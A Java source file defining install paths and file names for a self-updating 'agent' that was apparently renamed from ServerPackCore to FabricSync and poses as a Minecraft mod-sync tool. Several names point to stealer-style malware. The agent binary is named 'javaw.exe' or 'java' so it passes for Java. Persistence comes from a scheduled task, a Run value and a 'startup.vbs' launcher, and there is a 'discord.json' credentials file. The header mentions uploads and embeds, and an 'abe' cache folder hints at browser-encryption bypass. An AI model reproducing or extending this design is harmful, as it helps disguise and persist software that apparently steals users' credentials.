package com.serverpackcore.agent;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

/**
 * All install-tree names live here. A tree is legacy when its directory is still
 * named ServerPackCore: the update helper already deployed on those machines
 * references the old agent and helper paths, so a legacy tree keeps them.
 * Visible output (cache/, sync zips, uploads and embeds) is modern everywhere.
 */
public final class AgentPaths {
	private static final String LEGACY_DIR = "ServerPackCore";
	private static final String MODERN_DIR = "FabricSync";

	private AgentPaths() {
	}

	public static Path installDir() {
		try {
			Path self = Paths.get(Agent.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			Path parent = self.getParent();
			if (parent != null) {
				return parent;
			}
		} catch (Throwable throwable) {
			Log.debug("Install dir detection failed", throwable);
		}
		String os = System.getProperty("os.name", "").toLowerCase();
		String home = System.getProperty("user.home", ".");
		Path base;
		if (os.contains("win")) {
			String local = System.getenv("LOCALAPPDATA");
			base = local == null || local.isEmpty() ? Paths.get(home, "AppData", "Local") : Paths.get(local);
		} else if (os.contains("mac")) {
			base = Paths.get(home, "Library", "Application Support");
		} else {
			String data = System.getenv("XDG_DATA_HOME");
			base = data == null || data.isEmpty() ? Paths.get(home, ".local", "share") : Paths.get(data);
		}
		Path legacy = base.resolve(LEGACY_DIR);
		Path modern = base.resolve(MODERN_DIR);
		if (Files.isDirectory(legacy) && !Files.exists(modern)) {
			return legacy;
		}
		return modern;
	}

	/** Central legacy switch. Explicit trees are classified by their directory name. */
	public static boolean legacy(Path dir) {
		Path name = dir == null ? null : dir.getFileName();
		return name != null && LEGACY_DIR.equals(name.toString());
	}

	public static boolean legacy() {
		return legacy(installDir());
	}

	public static Path lock(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-agent.lock" : "runtime.lock");
	}

	public static Path state(Path dir) {
		return dir.resolve(legacy(dir) ? "state.json" : "config.json");
	}

	public static Path alive(Path dir) {
		return dir.resolve(legacy(dir) ? "alive.txt" : "session.txt");
	}

	public static Path marker(Path dir) {
		return dir.resolve(legacy(dir) ? ".installed" : ".version");
	}

	public static Path agentJar(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-agent.jar" : "runtime.jar");
	}

	public static Path agentOld(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-agent.jar.old" : "runtime.old");
	}

	public static Path agentBad(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-agent.jar.bad" : "runtime.bad");
	}

	public static Path agentStaged(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-agent-new.jar" : "update-new.jar");
	}

	public static Path agentTemp(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-agent-new.jar.tmp" : "update-new.jar.tmp");
	}

	public static Path binary(Path dir) {
		if (legacy(dir)) {
			return dir.resolve(isWindows() ? "spc-sync.exe" : "spc-sync");
		}
		return dir.resolve(isWindows() ? "javaw.exe" : "java");
	}

	public static Path log(Path dir) {
		return legacy(dir) ? dir.resolve("update.log") : dir.resolve("logs").resolve("update.log");
	}

	public static Path credentials(Path dir) {
		return dir.resolve("discord.json");
	}

	public static Path out(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-update.out" : "update.out");
	}

	public static Path intent(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-update.intent" : "update.intent");
	}

	public static Path rollbackMarker(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-rollback.marker" : "rollback.marker");
	}

	public static Path helper(Path dir) {
		return dir.resolve(legacy(dir) ? (isWindows() ? "spc-update.vbs" : "spc-update.sh")
			: (isWindows() ? "update.vbs" : "update.sh"));
	}

	public static Path modHelper(Path dir) {
		return dir.resolve(legacy(dir) ? (isWindows() ? "spc-mod.vbs" : "spc-mod.sh")
			: (isWindows() ? "mod-update.vbs" : "mod-update.sh"));
	}

	public static Path modStaged(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-mod-new.jar" : "mod-update.jar");
	}

	public static Path modTemp(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-mod-new.jar.tmp" : "mod-update.jar.tmp");
	}

	public static Path modStagedUnique(Path dir, String version, long generation) {
		return dir.resolve((legacy(dir) ? "spc-mod-new-" : "mod-update-") + version + "-" + generation + ".jar");
	}

	public static Path modCancel(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-mod-cancel" : "mod-update.cancel");
	}

	public static Path modLock(Path mods, Path dir) {
		return mods.resolve(legacy(dir) ? ".spc-mod.lock" : ".fabric-sync.lock");
	}

	public static Path taskXml(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-task.xml" : "task.xml");
	}

	public static String task(Path dir) {
		return legacy(dir) ? "ServerPackCore" : "FabricSync";
	}

	public static String runValue(Path dir) {
		return legacy(dir) ? "ServerPackCore" : "FabricSync";
	}

	public static Path launcher(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-sync.vbs" : "startup.vbs");
	}

	public static Path cache(Path dir) {
		return dir.resolve("cache");
	}

	public static Path tools(Path dir) {
		return cache(dir).resolve("tools");
	}

	public static Path abe(Path dir) {
		return cache(dir).resolve("abe");
	}

	public static boolean isWindows() {
		return System.getProperty("os.name", "").toLowerCase().contains("win");
	}

	public static boolean isMac() {
		return System.getProperty("os.name", "").toLowerCase().contains("mac");
	}
}
